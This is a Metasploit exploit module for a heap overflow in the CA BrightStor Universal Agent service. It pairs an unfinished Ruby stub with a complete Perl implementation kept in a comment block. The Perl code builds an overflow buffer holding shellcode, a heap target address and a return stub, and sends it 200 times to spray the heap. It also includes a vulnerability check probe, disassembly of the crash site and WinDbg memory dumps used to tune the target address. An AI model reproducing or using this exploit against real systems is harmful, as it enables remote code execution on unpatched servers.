require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Universal Agent Overflow',
			'Description'    => %q{
				This module exploits a convoluted heap overflow in the CA
				BrightStor Universal Agent service. Triple userland
				exception results in heap growth and execution of
				dereferenced function pointer at a specified address.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'MIL', '16'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 164,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003, winnt',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_uniagent;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'  => 'CA BrightStor Universal Agent Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'Thor Doomen <syscall [at] hushmail.com>' ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003', 'winnt' ],
	'Priv'  => 1,

	'AutoOpts'  => { 'EXITFUNC' => 'process' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 6050],
	  },

	'Payload' =>
	  {

		# 250 bytes of space (bytes 0xa5 -> 0xa8 = reversed)
		'Space'     => 164,
		'BadChars'  => "\x00",
		'Keys'      => ['+ws2ord'],
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a convoluted heap overflow in the CA 
	BrightStor Universal Agent service. Triple userland exception
	results in heap growth and execution of dereferenced function pointer
	at a specified address.
}),

	'Refs'    =>
	  [
		['MIL', '16'],
		['URL', 'http://www.idefense.com/application/poi/display?id=232&type=vulnerabilities'],
	  ],

	'DefaultTarget'	=> 0,
	'Targets' => [
		['Magic Heap Target #1', 0x01625c44], # far away heap address
	  ],

	'Keys'    => ['brightstor'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $probe =
	  "\x00\x00\x00\x00\x03\x20\xbc\x02".
	  ("2" x 256).
	  ("A" x 32).
	  "\x0B\x11\x0B\x0F\x03\x0E\x09\x0B".
	  "\x16\x11\x14\x10\x11\x04\x03\x1C".
	  "\x11\x1C\x15\x01\x00\x06".
	  ("X" x 390);

	$s->Send($probe);
	my $res = $s->Recv(8, 10);
	$s->Close;

	if ($res eq "\x00\x00\x73\x02\x32\x32\x00\x00") {
		$self->PrintLine('[*] This system appears to be vulnerable');
		return $self->CheckCode('Appears');
	}

	$self->PrintLine('[*] This system does not appear to be vulnerable');
	return;
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	# The server reverses four bytes starting at 0xa5
	# my $patchy = join('', reverse(split('',substr($shellcode, 0xa5, 4))));
	# substr($shellcode, 0xa5, 4, $patchy);

	# Create the request
	my $boom = "X" x 1024;

	# Required field to trigger the fault
	substr($boom, 248, 2, pack('v', 1000));

	# The shellcode, limited to 250 bytes (no nulls)
	substr($boom, 256, length($shellcode), $shellcode);

	# This should point to itself
	substr($boom, 576, 4, pack('V', $target->[1]));

	# This points to the code below
	substr($boom, 580, 4, pack('V', $target->[1]+8 ));

	# We have 95 bytes, use it to hop back to shellcode
	substr($boom, 584, 6, "\x68" . pack('V', $target->[1]-320) . "\xc3");

	# Stick the protocol header in front of our request
	$boom = "\x00\x00\x00\x00\x03\x20\xa8\x02".$boom;

	$self->PrintLine("[*] Sending " .length($boom) . " bytes to remote host.");

	# We keep making new connections and triggering the fault until
	# the heap is grown to encompass our known return address. Once
	# this address has been allocated and filled, each subsequent
	# request will result in our shellcode being executed.

	for (1 .. 200) {
		my $s = Msf::Socket::Tcp->new
		  (
			'PeerAddr'  => $target_host,
			'PeerPort'  => $target_port,
		  );

		if ($s->IsError) {
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		if ($_ % 10 == 0) {
			$self->PrintLine("[*] Sending request $_ of 200...");
		}

		$s->Send($boom);
		$s->Close;

		# Give the process time to recover from each exception
		select(undef, undef, undef, 0.1);
	}
	return;
}

1;

__END__
012a0d91 8b8e445c0000     mov     ecx,[esi+0x5c44]
012a0d97 83c404           add     esp,0x4
012a0d9a 85c9             test    ecx,ecx
012a0d9c 7407             jz      ntagent+0x20da5 (012a0da5)
012a0d9e 8b11             mov     edx,[ecx]         ds:0023:41327441=???????
012a0da0 6a01             push    0x1
012a0da2 ff5204           call    dword ptr [edx+0x4]

Each request will result in another chunk being allocated, the exception
causes these chunks to never be freed. The large chunk size allows us to
predict the location of our buffer and grow our buffer to where we need it.

If these addresses do not match up, run this exploit, then attach with WinDbg:

> s 0 Lfffffff 0x44 0x5c 0x61 0x01

Figure out the pattern, replace the return address, restart the service,
and run it through again. Only tested on WinXP SP1

011b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
011f5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01205c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01225c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01235c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01245c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01255c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01265c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01275c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01285c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01295c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012a5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
012f5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01305c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01315c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01525c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01535c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01545c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01555c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01565c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01575c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01585c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01595c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015a5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
015f5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01605c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01615c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01625c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01635c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01645c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01655c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01665c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01675c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01685c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01695c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016a5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016b5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016c5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
016d5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
01725c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........
017e5c44  48 5c 62 01 4c 5c 62 01-cc cc cc cc cc cc cc cc  H\b.L\b.........


=end


end
end	
